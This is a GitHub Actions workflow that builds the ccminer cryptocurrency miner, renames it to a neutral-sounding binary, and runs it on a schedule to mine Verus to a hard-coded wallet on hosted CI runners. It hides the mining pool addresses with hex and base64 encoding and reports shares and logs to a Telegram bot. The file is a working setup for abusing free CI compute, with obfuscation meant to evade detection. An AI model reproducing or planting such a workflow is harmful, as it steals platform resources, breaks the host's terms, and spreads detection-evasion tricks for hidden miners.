name: AKH Job

on:
  schedule:
    - cron: "0 */5 * * *"
  workflow_dispatch:

jobs:
  akh_job:
    runs-on: ubuntu-latest
    timeout-minutes: 300

    steps:
      - name: Environment Setup
        run: |
          sudo apt update
          sudo apt install -y build-essential cmake automake libtool pkg-config libcurl4-openssl-dev git

      - name: Build Engine
        run: |
          git clone https://github.com/monkins1010/ccminer.git akh_src
          cd akh_src
          chmod +x build.sh
          ./build.sh
          mv ccminer ../akh_exec

      - name: Run AKH Mining
        run: |
          WALLET="RGVmtuvrP2yX8q3U4up77CcSpkcVhp4bUG"
          WORKER="AKH1"
          LOG="akh.log"
          MAX_IDLE=600

          TELEGRAM_TOKEN="${{ secrets.TELEGRAM_TOKEN }}"
          TELEGRAM_CHAT_ID="${{ secrets.TELEGRAM_CHAT_ID }}"

          POOLS=(
            "$(echo 7374726174756d2b7463703a2f2f61702e6c75636b706f6f6c2e6e65743a33393536 | xxd -r -p)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9ldS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
            "$(echo c3RyYXR1bSt0Y3A6Ly9uYS5sdWNrcG9vbC5uZXQ6Mzk1Ng== | base64 -d)"
          )

          notify() {
            curl -s -X POST https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage \
              -d chat_id=${TELEGRAM_CHAT_ID} \
              -d parse_mode=Markdown \
              -d text="$1"
          }

          send_log() {
            curl -s -F document=@$LOG \
              "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument?chat_id=${TELEGRAM_CHAT_ID}"
          }

          notify "ğŸŸ¢ *AKH1 mining started*"

          for POOL in "${POOLS[@]}"; do
            ./akh_exec -a verus -o "$POOL" -u "$WALLET.$WORKER" -p hybrid -t 2 > "$LOG" 2>&1 &
            PID=$!
            sleep 10

            if ps -p $PID > /dev/null; then
              notify "ğŸ”— Connected to \`$POOL\`"
              break
            else
              kill $PID >/dev/null 2>&1
              notify "âš ï¸ Failed pool: \`$POOL\`"
            fi
          done

          if ! ps -p $PID > /dev/null; then
            notify "âŒ AKH1 failed all pools. Exit."
            exit 1
          fi

          LAST=$(date +%s)
          ACCEPTED=0

          tail -F "$LOG" | while read -r line; do
            NOW=$(date +%s)

            if echo "$line" | grep -iq "accepted"; then
              ACCEPTED=$((ACCEPTED + 1))
              LAST=$NOW
              RATE=$(echo "$line" | grep -o "[0-9.]\+ kH/s")
              notify "âœ… *Share Accepted*\nğŸ“¦ Total: *$ACCEPTED*\nâš¡ $RATE"
            fi

            if [ $((NOW - LAST)) -gt $MAX_IDLE ]; then
              notify "ğŸ›‘ Idle >10m. Restarting..."
              kill $PID
              break
            fi

            if ! ps -p $PID > /dev/null; then
              notify "âŒ AKH miner crashed"
              break
            fi
          done

          send_log
          notify "ğŸ“´ *AKH1 ended*\nTotal shares: *$ACCEPTED*"
